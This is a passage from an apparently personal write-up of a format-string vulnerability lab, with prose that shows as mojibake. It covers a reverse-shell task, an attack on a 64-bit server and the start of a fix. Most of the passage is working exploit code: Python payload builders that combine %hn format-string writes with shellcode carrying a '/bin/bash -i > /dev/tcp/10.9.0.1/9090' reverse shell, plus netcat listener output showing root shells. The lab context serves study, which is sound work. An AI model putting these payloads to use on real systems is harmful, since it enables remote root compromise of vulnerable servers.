832<br>server-10.9.0.5 | -rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 319488 </span>Mar<span class="hljs-number"> 29 </span>13:23 core<br>server-10.9.0.5 | -rwxrwxr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 709340 </span>Mar<span class="hljs-number"> 27 </span>07:43 format<br>server-10.9.0.5 | -rwxrwxr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 17880 </span>Mar<span class="hljs-number"> 27 </span>07:43 server<br>server-10.9.0.5 | ===== Success! ======<br><br></code></pre></td></tr></table></figure><p>æ ¹æ®å›æ˜¾å¯ä»¥ç¡®å®šè§¦å‘äº†/bin/lså‘½ä»¤</p><h2 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell"></a>Getting a Reverse Shell</h2><p> We are not interested in running some pre-determined commands. We want<br>to get a root shell on the target server, so we can type any command we want. Since we are on a remote<br>machine, if we simply get the server to run /bin/bash, we wonâ€™t be able to control the shell program.<br>Reverse shell is a typical technique to solve this problem. Section 9 provides detailed instructions on how<br>to run a reverse shell. Please modify the command string in your shellcode, so you can get a reverse shell<br>on the target server. Please include screenshots and explanation in your lab report.</p><p>ä¾›ç»™ç«¯ipä¸ºinet 10.9.0.1</p><p>æ”»å‡»ç«¯è¿è¡Œ<code>nc -l 9090 -nv</code>ç­‰å¾…reverse shell</p><p>æ›´æ”¹pyè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br> <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>    <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span> <br> <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)       <span class="hljs-comment">#0d1364       </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br> <span class="hljs-comment">#        ffff                 db64</span><br><span class="hljs-comment">#0xFFFFD53C+2            0xFFFFD53C</span><br><br>ret_addr=<span class="hljs-number">0xFFFFD53C</span><br><br>ret_addr_low=ret_addr     <span class="hljs-comment"># DA90</span><br>ret_addr_high=ret_addr+<span class="hljs-number">2</span>  <span class="hljs-comment"># FFFF</span><br><br><span class="hljs-comment">#change retaddr into 0xffffd610+0d1364=0xffff DA90</span><br><br><span class="hljs-comment"># new_ret=ret_addr+1364</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]=(ret_addr_low).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]=(<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&quot;latin-1&quot;</span>)<br><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]=(ret_addr_high).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-comment">#0xDA90-12-8*62=55952-508=55444</span><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.55444x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.9583x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure><p>å›æ˜¾</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">5</span> <span class="hljs-number">58502</span><br>root<span class="hljs-variable">@d21da27aa2b7</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h1><ul><li><p><strong>The input bufferâ€™s address: 0x00007fffffffe540</strong></p></li><li><p><strong>Frame Pointer (inside myprintf): 0x00007fffffffe480</strong></p></li></ul><p>è¾“å…¥ï¼š</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">echo AAAA-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>- | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.6</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span>-<span class="hljs-number">555592</span>a<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">39</span>-<span class="hljs-number">90</span>-ffffe<span class="hljs-number">540</span>-<span class="hljs-number">0</span>-ffffe<span class="hljs-number">480</span>-ffffe<span class="hljs-number">510</span>-<span class="hljs-number">55555383</span>-<span class="hljs-number">5</span>dc-ffffe<span class="hljs-number">540</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">19</span>c<span class="hljs-number">09500</span>-ffffeb<span class="hljs-number">30</span>-<span class="hljs-number">5555531</span>b-ffffec<span class="hljs-number">28</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">41414141</span><br></code></pre></td></tr></table></figure><p>ä¿å­˜åˆ°tmpä¸­ï¼Œgrepä¸€ä¸‹ï¼Œå‘ç°åç§»ä¸º34</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">~$ grep -o &#x27;-&#x27; tmp | wc - l<br>    <span class="hljs-number"> 34 </span>    <span class="hljs-number"> 34 </span>    <span class="hljs-number"> 68 </span>-<br></code></pre></td></tr></table></figure><p>printfé‡åˆ°0ä¼šç»ˆæ­¢è¾“å‡ºï¼Œç”±äº64ä½çš„åœ°å€éƒ½ä¼šæœ‰0ï¼Œæ‰€ä»¥åœ°å€åº”è¯¥æ”¾åœ¨å­—ç¬¦ä¸²çš„åé¢</p><p>æ‰¾åˆ°shellcodeçš„åœ°å€ï¼Œå¹¶æ ¼å¼åŒ–è¾“å‡ºï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">shellcode_addr</span>=start+buf<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%shellcode_addr) <br></code></pre></td></tr></table></figure><p><strong>shellcode_addrï¼š0x7fffffffea77</strong></p><p>ä½¿ç”¨%hnæ¯æ¬¡æ›´æ”¹ä¸¤å­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦ä»¥ä¸‹ä¸‰ä¸ªåœ°å€</p> <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># print(&#x27;%#x&#x27;%shellcode_addr) 0x 0000 7fff ffff ea77</span><br><span class="hljs-attr">s_0_16</span>=<span class="hljs-number">0</span>xea77<br><span class="hljs-attr">s_16_32</span>=<span class="hljs-number">0</span>xffff<br><span class="hljs-attr">s_32_48</span>=<span class="hljs-number">0</span>x7fff<br></code></pre></td></tr></table></figure><p>æ ¹æ®å¤§å°é¡ºåºæ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># order : s_32_48  s_0_16  s_16_32</span><br><br><span class="hljs-attribute">fmt</span>=&#x27;%.&#x27;+str(s_<span class="hljs-number">32</span>_<span class="hljs-number">48</span>)+&#x27;x%<span class="hljs-number">11</span>$hn&#x27;<br><span class="hljs-attribute">fmt</span>+=&#x27;%.&#x27; + str(s_<span class="hljs-number">0</span>_<span class="hljs-number">16</span>-s_<span class="hljs-number">32</span>_<span class="hljs-number">48</span>) + &#x27;x%<span class="hljs-number">12</span>$hn&#x27;<br><span class="hljs-attribute">fmt</span>+=&#x27;%.&#x27; + str(s_<span class="hljs-number">16</span>_<span class="hljs-number">32</span>-s_<span class="hljs-number">0</span>_<span class="hljs-number">16</span>) + &#x27;x%<span class="hljs-number">13</span>$hn&#x27;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°fmtå­—ç¬¦ä¸²çš„å¤§å°ä¸º41</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(len(fmt)</span></span>) <span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><p>ç›®æ ‡åœ°å€</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ret1</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">488</span> # ret_myprint<br><span class="hljs-attribute">ret2</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">48</span>a # ret_myprint + <span class="hljs-number">2</span> <br><span class="hljs-attribute">ret3</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">48</span>c # ret_myprint + <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>è®¡ç®—åç§»</p><p>ä»å‰é¢å¯çŸ¥ï¼Œåˆ°bufferçš„åç§»ä¸º34ï¼Œç”±äºfmtå­—ç¬¦ä¸²æœ‰41ä¸ªå­—èŠ‚ï¼Œå› æ­¤è¦ä»8çš„æ•´æ•°å€å¼€å§‹å¡«å……åœ°å€ï¼Œä¹Ÿå³æ˜¯ç¬¬48ä¸ªå­—èŠ‚</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230330223149351.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># from 6th </span><br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">48</span>:<span class="hljs-number">56</span>] = (s<span class="hljs-number">3</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">56</span>:<span class="hljs-number">64</span>] = (s<span class="hljs-number">1</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">64</span>:<span class="hljs-number">72</span>] = (s<span class="hljs-number">2</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ”»å‡»è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br> <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>    <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span> <br> <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_64<br><br>buf=<span class="hljs-number">0x00007fffffffe540</span><br>rbp=<span class="hljs-number">0x00007fffffffe480</span><br>ret_myprint=rbp+<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%ret_myprint)<br><span class="hljs-comment"># Put the shellcode somewhere in the payload 0x 7fff ffff e488</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)            <br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br>shellcode_addr=start+buf<br><span class="hljs-comment"># print(&#x27;%#x&#x27;%shellcode_addr) 0x 0000 7fff ffff ea77</span><br>s_0_16=<span class="hljs-number">0xea77</span><br>s_16_32=<span class="hljs-number">0xffff</span><br>s_32_48=<span class="hljs-number">0x7fff</span><br><br><span class="hljs-comment"># order : s_32_48  s_0_16  s_16_32</span><br><br>fmt =<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_32_48)+<span class="hljs-string">&#x27;x%40$hn&#x27;</span><br>fmt+=<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_0_16-s_32_48) + <span class="hljs-string">&#x27;x%41$hn&#x27;</span><br>fmt+=<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_16_32-s_0_16) + <span class="hljs-string">&#x27;x%42$hn&#x27;</span><br><br><span class="hljs-comment"># print(len(fmt)) 41</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(fmt)]=fmt.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>ret1=<span class="hljs-number">0x7fffffffe488</span><br>ret2=<span class="hljs-number">0x7fffffffe48a</span><br>ret3=<span class="hljs-number">0x7fffffffe48c</span><br><br><span class="hljs-comment"># from 6th </span><br>content[<span class="hljs-number">48</span>:<span class="hljs-number">56</span>] = (ret3).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">56</span>:<span class="hljs-number">64</span>] = (ret1).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">64</span>:<span class="hljs-number">72</span>] = (ret2).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(content)<br><br></code></pre></td></tr></table></figure><p>å¼€ä¸€ä¸ªshellç›‘å¬</p> <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">6</span> <span class="hljs-number">53258</span><br>root<span class="hljs-variable">@7ebdb2357116</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªshellæ‰§è¡Œï¼š<code>cat badfile | nc 10.9.0.6 9090</code></p><p>è·å¾—åå‘shell</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">6</span> <span class="hljs-number">53258</span><br>root<span class="hljs-variable">@7ebdb2357116</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="Task-6-Fixing-the-Problem"><a href="#Task-6-Fixing-the-Problem" class="headerlink" title="Task 6: Fixing the Problem"></a>Task 6: Fixing the Problem</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ make <br>gcc -o <span class="hljs-keyword">server</span> <span class="hljs-keyword">server</span>.c<br>gcc -DBUF_SIZE=<span class="hljs-number">100</span> -z execstack  -static -m32 -o <span class="hljs-keyword">format</span><span 